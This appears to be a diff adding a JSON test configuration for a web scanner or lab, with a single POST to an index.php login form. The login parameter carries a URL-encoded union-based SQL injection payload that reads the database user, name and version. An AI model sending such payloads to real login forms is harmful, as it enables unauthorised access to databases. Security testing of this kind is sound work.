@@ -1,0 +1,19 @@
+[
+  {
+    "url": "https://app5.com/www/index.php?index_page", 
+    "loginurl": "", 
+    "type": "POST", 
+    "loginrequired": "false", 
+    "param": {
+      "login": [
+        "admin''#%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "password": [
+        "admin"
+      ], 
+      "_qf__login_form": [
+        "a"
+      ]
+    }
+  }
+]
